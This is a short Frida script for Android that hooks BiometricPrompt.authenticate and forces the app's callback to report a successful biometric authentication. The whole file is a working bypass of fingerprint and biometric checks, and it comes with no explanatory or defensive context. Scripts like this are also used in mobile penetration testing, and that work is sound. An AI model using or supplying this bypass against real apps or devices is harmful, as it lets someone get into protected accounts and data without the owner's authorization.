var authResult = null;

Java.perform(function(){
	hookBioPrompt()
;})

function hookBioPrompt()
{
	console.log("")
	console.log("[+] Hooking BiometricPrompt.authenticate method...")
    var biometricPrompt = Java.use('android.hardware.biometrics.BiometricPrompt')['authenticate'].overload('android.os.CancellationSignal', 'java.util.concurrent.Executor', 'android.hardware.biometrics.BiometricPrompt$AuthenticationCallback');
    biometricPrompt.implementation = function(cancellationSignal,executor,callback){
    	console.log("[+] Calling onAuthenticationSucceeded method...")
    	callback.onAuthenticationSucceeded(authResult);
    }
}
